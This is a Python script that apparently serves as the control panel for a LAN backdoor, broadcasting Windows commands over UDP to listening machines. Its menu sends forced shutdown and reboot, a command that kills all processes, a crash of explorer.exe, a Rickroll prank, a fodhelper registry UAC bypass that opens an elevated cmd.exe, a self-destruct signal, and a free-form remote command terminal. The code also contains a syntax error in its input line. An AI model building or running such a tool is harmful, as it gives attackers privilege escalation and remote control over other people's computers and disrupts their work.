import socket
import sys
import os


BROADCAST_IP = "255.255.255.255"  
PORT = 45326   



def shutdownWin():

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    message = 'shutdown /s /f /t 0'
    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
    print("Command Executed")

def rebootWin():

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  
    message = 'shutdown /r /f /t 0'
    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
    print("Command Executed")


def RickRoll():

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) 
    message = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
    print("Command Executed")


def KillEmAll():

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) 
    message = 'powershell -Command "Get-Process | Where-Object { $_.Name -ne \"explorer\" } | ForEach-Object { $_.Kill() }"'
    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
    print("Command Executed")


def Crash():

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) 
    message = 'taskkill /f /im explorer.exe'
    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
    print("Command Executed")


def UACBypass():

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  
    message = 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe'
    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
    print("Command Executed")


def Terminal():

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  
    print("Type 'Leave' to exit")
    while True:
        message = input()
        if message.lower() == "leave":
            break
        else:
            sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
            print("Command Executed")


def self_destruct():

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  
    message = 'self_destruct'
    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
    print("Command Executed")
# 
sub_menu_options = [
    "Shutdown",
    "Reboot",
    "RickRoll",
    "Kill All Process",
    "Crash",
    "SELF DESTRUCTION",
    "UACBypass",
    "Cmd",
    "Exit"
]


if __name__ == "__main__":
    while True:
        print("\n--- MENU ---")
        for i, option in enumerate(sub_menu_options):
            print(f"{i + 1}. {option}")

        try:
            choice = int(input("Select the option: ")
            if choice == 1:
                shutdownWin()
            elif choice == 2:
                rebootWin()
            elif choice == 3:
                RickRoll()
            elif choice == 4:
                KillEmAll()
            elif choice == 5:
                Crash()
            elif choice == 6:
                self_destruct()
            elif choice == 7:
                UACBypass()
            elif choice == 8:
                Terminal()
            elif choice == 9:
                print("Exit", 3)
                break
            else:
                print("Not a valid option.")
        except ValueError:
            print("Not a valid input")
